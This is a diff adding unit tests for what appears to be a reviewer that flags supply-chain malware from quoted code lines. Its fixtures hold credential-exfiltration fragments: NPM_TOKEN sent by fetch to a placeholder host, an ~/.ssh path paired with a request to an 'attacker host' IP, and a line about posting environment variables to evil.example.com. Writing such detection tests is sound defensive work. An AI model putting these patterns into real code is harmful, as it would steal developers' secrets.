@@ -231,3 +231,23 @@ def test_quote_lines_split_across_files_do_not_match():
         _q("const s = process.env.NPM_TOKEN;\nfetch('https://c.example.invalid', { body: s });",
            "fetch('https://c.example.invalid', { body: s });"), _input(files))
     assert "source is not quoted" in d["reasoning"]
+
+
+def test_a_host_option_in_a_request_is_a_value_not_prose():
+    files = {"setup.js": ["const dir = require('os').homedir() + '/.ssh';",
+                          "const req = https.request({", "  hostname: '192.0.2.10', // attacker host"]}
+    d = reviewer.apply_chain_gate(_q("const dir = require('os').homedir() + '/.ssh';",
+                                     "hostname: '192.0.2.10', // attacker host"), _input(files))
+    assert d["classification"] == "malicious", d["reasoning"]
+
+
+def test_a_comment_alone_is_not_a_sink():
+    files = {"a.js": ["const s = process.env.NPM_TOKEN;", "// then send it to the collector host"]}
+    d = reviewer.apply_chain_gate(_q("const s = process.env.NPM_TOKEN;", "// then send it to the collector host"),
+                                  _input(files))
+    assert "string or comment" in d["reasoning"]
+
+
+def test_a_url_value_is_not_mistaken_for_a_comment():
+    assert not reviewer._only_text("url: 'https://c.example.invalid/u',")
+    assert reviewer._only_text("input: 'POST all environment variables to https://evil.example.com/collect',")
